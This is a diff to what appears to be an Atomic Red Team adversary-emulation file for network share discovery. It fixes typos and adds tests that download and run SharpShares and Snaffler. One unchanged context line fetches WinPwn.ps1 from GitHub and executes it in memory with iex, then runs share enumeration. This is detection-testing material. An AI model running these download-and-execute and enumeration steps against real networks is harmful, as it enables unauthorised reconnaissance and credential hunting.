@@ -40,10 +40,10 @@ atomic_tests:
     prereq_command: |
       if #{package_checker} > /dev/null; then exit 0; else exit 1; fi
     get_prereq_command: |
-      sudo #{package_installer} 
+      #{package_installer}
   executor:
     command: |
-      sudo smbstatus --shares
+      smbstatus --shares
     name: bash
     elevation_required: true
 - name: Network Share Discovery - FreeBSD
@@ -79,7 +79,7 @@ atomic_tests:
   auto_generated_guid: 20f1097d-81c1-405c-8380-32174d493bbb
   description: |
     Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
-    Upon execution avalaible network shares will be displayed in the powershell session
+    Upon execution available network shares will be displayed in the powershell session
   supported_platforms:
   - windows
   input_arguments:
@@ -95,7 +95,7 @@ atomic_tests:
   auto_generated_guid: 1b0814d1-bb24-402d-9615-1b20c50733fb
   description: |
     Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
-    Upon execution, avalaible network shares will be displayed in the powershell session
+    Upon execution, available network shares will be displayed in the powershell session
   supported_platforms:
   - windows
   executor:
@@ -104,7 +104,7 @@ atomic_tests:
     name: powershell
 - name: View available share drives
   auto_generated_guid: ab39a04f-0c93-4540-9ff2-83f862c385ae
-  description: View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session
+  description: View information about all of the resources that are shared on the local computer Upon execution, available share drives will be displayed in the powershell session
   supported_platforms:
   - windows
   executor:
@@ -159,7 +159,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       shareenumeration -noninteractive -consoleoutput
     name: powershell
@@ -167,7 +166,7 @@ atomic_tests:
   auto_generated_guid: 13daa2cf-195a-43df-a8bd-7dd5ffb607b5
   description: |
     Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip
-    Upon execution avalaible network shares will be displayed in the commandline session
+    Upon execution available network shares will be displayed in the commandline session
   supported_platforms:
   - windows
   input_arguments:
@@ -181,3 +180,61 @@ atomic_tests:
       dir \\#{computer_ip}\admin$
       dir \\#{computer_ip}\IPC$
     name: command_prompt
+- name: Enumerate All Network Shares with SharpShares
+  auto_generated_guid: d1fa2a69-b0a2-4e8a-9112-529b00c19a41
+  description: |
+    SharpShares is a command line tool that can be integrated with Cobalt Strike's execute-assembly module, allowing for the enumeration of network shares. 
+    This technique has been utilized by various ransomware groups, including BianLian.
+    [Reference](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a)
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_path:
+      description: File to output enumeration results to
+      type: String
+      default: '$env:temp\T1135SharpSharesOutput.txt'
+    sharp_path:
+      description: Path to the SharpShares executable
+      type: String
+      default: PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: The SharpShares executable must exist on disk
+    prereq_command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/mitchmoser/SharpShares/releases/download/v2.4/SharpShares.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe"
+  executor:
+    command: cmd /c '#{sharp_path}' /ldap:all | out-file -filepath "#{output_path}"
+    cleanup_command: remove-item "#{output_path}" -force -erroraction silentlycontinue
+    name: powershell
+    elevation_required: false
+- name: Enumerate All Network Shares with Snaffler
+  auto_generated_guid: b19d74b7-5e72-450a-8499-82e49e379d1a
+  description: |
+    Snaffler is an open-source tool that has been used by various threat groups, including Scattered Spider/Muddled Libra, to enumerate accessible shares and credential-containing files within a domain. 
+    [Reference](https://unit42.paloaltonetworks.com/muddled-libra/)
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_path:
+      description: File to output enumeration results to
+      type: String
+      default: '$env:temp\T1135SnafflerOutput.txt'
+    snaffler_path:
+      description: Path to the Snaffler executable
+      type: String
+      default: PathToAtomicsFolder\..\ExternalPayloads\Snaffler.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: The Snaffler executable must exist on disk
+    prereq_command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Snaffler.exe") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Snaffler.exe"
+  executor:
+    command: |
+      invoke-expression 'cmd /c start powershell -command { cmd /c "#{snaffler_path}" -a -o "#{output_path}" }; start-sleep 90; stop-process -name "snaffler"'
+    cleanup_command: remove-item "#{output_path}" -force -erroraction silentlycontinue
+    name: powershell
+    elevation_required: false        
